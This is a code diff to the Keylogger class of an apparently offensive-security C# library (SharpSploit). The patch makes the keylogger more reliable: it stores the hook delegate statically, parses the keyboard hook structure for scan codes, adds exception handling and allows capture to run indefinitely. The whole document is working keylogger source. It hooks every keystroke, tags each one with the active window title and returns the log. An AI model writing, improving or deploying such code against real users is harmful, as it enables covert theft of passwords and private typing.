@@ -20,6 +20,8 @@ namespace SharpSploit.Enumeration
     /// </summary>
     public class Keylogger
     {
+        private static Win32.User32.HookProc HookProc;
+
         /// <summary>
         /// Starts the Keylogger
         /// </summary>
@@ -33,50 +35,69 @@ namespace SharpSploit.Enumeration
             
             IntPtr HookID = IntPtr.Zero;
             string PreviousActiveWindow = "";
-            Win32.User32.HookProc hookproc = (nCode, wParam, lParam) =>
+            HookProc = (nCode, wParam, lParam) =>
             {
-                var CurrentActiveWindow = GetActiveWindowTitle();
-                if (CurrentActiveWindow != PreviousActiveWindow)
+                try
                 {
-                    Builder.Append("\r\n");
-                    PreviousActiveWindow = CurrentActiveWindow;
-                    Builder.Append("\r\n" + DateTime.Now + "\r\n" + CurrentActiveWindow + "\r\n--------------------------\r\n");
-                }
-                if (nCode >= 0 && wParam == (IntPtr)Win32.User32.WM_KEYDOWN)
-                {
-                    int vkCode = Marshal.ReadInt32(lParam);
-                    
-                    bool shifted = PInvoke.Win32.User32.GetKeyState(160) < 0 || PInvoke.Win32.User32.GetKeyState(161) < 0;
-                    Keys keycode = (Keys)vkCode;
-                    if (!(shifted && KeyDictShift.TryGetValue(keycode, out string append)) &&  !KeyDict.TryGetValue(keycode, out append))
+                    var CurrentActiveWindow = GetActiveWindowTitle();
+                    if (CurrentActiveWindow != PreviousActiveWindow)
                     {
-                        bool capped = PInvoke.Win32.User32.GetKeyState(20) != 0;
-                        if ((capped && shifted) || !(capped || shifted))
-                        {
-                            append = keycode.ToString().ToLower();
-                        }
-                        else
-                        {
-                            append = keycode.ToString().ToUpper();
-                        }
+                        Builder.Append("\r\n");
+                        PreviousActiveWindow = CurrentActiveWindow;
+                        Builder.Append("\r\n" + DateTime.Now + "\r\n" + CurrentActiveWindow + "\r\n--------------------------\r\n");
                     }
-                    Builder.Append(append);
+                    if (nCode >= 0 && wParam == (IntPtr)Win32.User32.WM_KEYDOWN)
+                    {
+                        KbDllHookStruct kbHookStruct = (KbDllHookStruct)Marshal.PtrToStructure(lParam, typeof(KbDllHookStruct));
+                        int vkCode = kbHookStruct.VirtualKeyCode;
+                        bool shifted = PInvoke.Win32.User32.GetKeyState(160) < 0 || PInvoke.Win32.User32.GetKeyState(161) < 0;
+                        Keys keycode = (Keys)vkCode;
+                        if (!(shifted && KeyDictShift.TryGetValue(keycode, out string append)) && !KeyDict.TryGetValue(keycode, out append))
+                        {
+                            bool capped = PInvoke.Win32.User32.GetKeyState(20) != 0;
+                            if ((capped && shifted) || !(capped || shifted))
+                            {
+                                append = keycode.ToString().ToLower();
+                            }
+                            else
+                            {
+                                append = keycode.ToString().ToUpper();
+                            }
+                        }
+                        if (vkCode == 231)
+                        {
+                            append = ((char)kbHookStruct.ScanCode).ToString();
+                        }
+                        Builder.Append(append);
+                    }
+                }
+                catch (Exception e)
+                {
+                    Console.Error.WriteLine("Keylogger Exception - " + e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
                 }
                 return PInvoke.Win32.User32.CallNextHookEx(HookID, nCode, wParam, lParam);
             };
-            HookID = PInvoke.Win32.User32.SetWindowsHookEx(Win32.User32.WH_KEYBOARD_LL, hookproc, PInvoke.Win32.Kernel32.GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);
-            using (Timer timer = new Timer(Seconds * 1000))
+            HookID = PInvoke.Win32.User32.SetWindowsHookEx(Win32.User32.WH_KEYBOARD_LL, HookProc, PInvoke.Win32.Kernel32.GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);
+            if (Seconds <= 0)
             {
-                timer.Elapsed += (source, e) =>
-                {
-                    Builder.AppendLine(String.Format("\r\n\r\nFinished Keylogger at {0:HH:mm:ss.fff}", DateTime.Now));
-                    PInvoke.Win32.User32.UnhookWindowsHookEx(HookID);
-                    timer.Stop();
-                    Forms.Application.Exit();
-                };
-                timer.Start();
                 Forms.Application.Run();
-                return Builder.ToString();
+                return "";
+            }
+            else
+            {
+                using (Timer timer = new Timer(Seconds * 1000))
+                {
+                    timer.Elapsed += (source, e) =>
+                    {
+                        Builder.AppendLine(String.Format("\r\n\r\nFinished Keylogger at {0:HH:mm:ss.fff}", DateTime.Now));
+                        PInvoke.Win32.User32.UnhookWindowsHookEx(HookID);
+                        timer.Stop();
+                        Forms.Application.Exit();
+                    };
+                    timer.Start();
+                    Forms.Application.Run();
+                    return Builder.ToString();
+                }
             }
         }
         
@@ -382,6 +403,16 @@ namespace SharpSploit.Enumeration
             Shift = 65536,
             Control = 131072,
             Alt = 262144
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct KbDllHookStruct
+        {
+            public int VirtualKeyCode;
+            public int ScanCode;
+            public int Flags;
+            public int Time;
+            public int ExtraInfo;
         }
     }
 }
